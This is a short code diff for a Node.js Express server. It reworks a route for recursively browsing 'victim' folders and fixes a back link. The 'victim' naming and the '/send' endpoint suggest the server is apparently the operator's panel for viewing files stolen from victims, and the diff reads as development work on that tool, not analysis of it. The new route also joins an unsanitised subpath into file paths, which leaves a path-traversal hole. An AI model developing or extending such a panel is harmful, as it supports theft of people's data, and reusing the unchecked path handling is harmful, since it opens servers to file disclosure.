@@ -70,11 +70,11 @@ app.post("/send", async (req, res) => {
   }
 });
 
-// --- Browse victim files (recursive) ---
-app.get("/victim/:id/*", async (req, res) => {
+// --- Browse victim files (recursive) - must be BEFORE /victim/:id ---
+app.get("/victim/:id/:subpath+", async (req, res) => {
   const safeId = path.basename(req.params.id);
   const victimDir = path.join(VICTIMS_DIR, safeId);
-  const subPath = req.params[0] || "";
+  const subPath = req.params.subpath;
   const fullPath = path.join(victimDir, subPath);
 
   // Check if it's a directory
@@ -82,7 +82,7 @@ app.get("/victim/:id/*", async (req, res) => {
     const stats = await fs.stat(fullPath);
     if (stats.isDirectory()) {
       const files = await fs.readdir(fullPath);
-      const backLink = subPath ? "/victim/" + safeId + "/" + path.dirname(subPath).replace(/\\/g, "/") : "/";
+      const backLink = subPath ? "/victim/" + safeId + "/" + path.dirname(subPath).replace(/\\/g, "/") : "/victim/" + safeId;
       res.send(
         `<h2>Folder: ${subPath || safeId}</h2>
         <a href="${backLink}">⬅ Back</a>
